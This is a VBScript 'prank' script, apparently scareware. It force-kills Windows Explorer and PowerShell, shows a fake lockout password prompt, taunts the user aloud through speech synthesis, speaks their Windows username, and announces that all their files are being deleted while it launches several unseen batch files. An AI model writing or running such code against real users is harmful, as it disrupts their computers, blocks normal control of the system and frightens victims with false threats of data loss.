Dim msg, sapi, name, shell
on error resume next


' FINAL PHASE

Set shell = wscript.createobject("wscript.shell")
Set sapi=CreateObject("sapi.spvoice")
set WshNtwk=createobject("wscript.network")
do

shell.run "SimpleBAT.bat", 0
wscript.sleep 2500
shell.run "taskkill /im explorer.exe -f", 0
sapi.rate = 5
sapi.speak "welcome to your computer lo lo lo lo lo lo lo lo lo lo"
shell.run "KillTasks.bat", 0
shell.run "SapiIntro.bat", 0
wscript.sleep 2000

msg=InputBox("Oops, you got locked out!!!                                                                                                                                                                                         	Please enter the password." ,"Login" ,"Password Here")
shell.run "taskkill /im powershell.exe -f", 0
sapi.rate = 3
sapi.speak "oh crap buddy thats the wrong password"
shell.popup "Yikes... incorrect password," & vbCrLf & vbCrLf & "try again!", 10,"Access Denied",vbExclamation
shell.run "Sapi.bat", 0

msg=InputBox("Oops, you got locked out!!!                                                                                                                                                                                         	Please enter the password." ,"Login" ,"Password Here")
shell.run "taskkill /im powershell.exe -f", 0
sapi.rate = 1
sapi.speak "again, wrong password. this is your last chance"
shell.popup "Seriously bro... this better be correct!", 10,"Access Denied",vbCritical
shell.run "Sapi.bat", 0

name=InputBox("Oops, you got locked out!!!                                                                                                                                                                                         	Please enter the password.                                                                                                                                                                                          	Hint: Maybe your first name?" ,"Login" ,"")
shell.run "taskkill /im powershell.exe -f", 0
sapi.rate = 0
sapi.speak "Password Correct. Access granted!"
shell.run "FirePlace.bat", 0
sapi.rate = 0
sapi.speak "Just kidding, wrong password, now im about to delete all your files, your photos, your browser history, um, im sure you want that deleted, but its all gone!"

shell.run "MouseShake.bat", 0
shell.run "cmd1.bat"
shell.run "cmd2.bat"
shell.run "cmd3.bat"
wscript.sleep 1000
sapi.rate = 0
if name="" Or name="password" Or name="Password Here" Or name="first name" then 
sapi.speak WshNtwk.UserName
else
sapi.speak name
end if
sapi.speak "my guy, you are so screwed"
shell.run "AutoRemoveStartupShortcut.bat", 0
shell.run "sapiPRANK.vbs" 


wscript.quit
loop

'Original Creation Date: 3/16/2020 11:06 AM'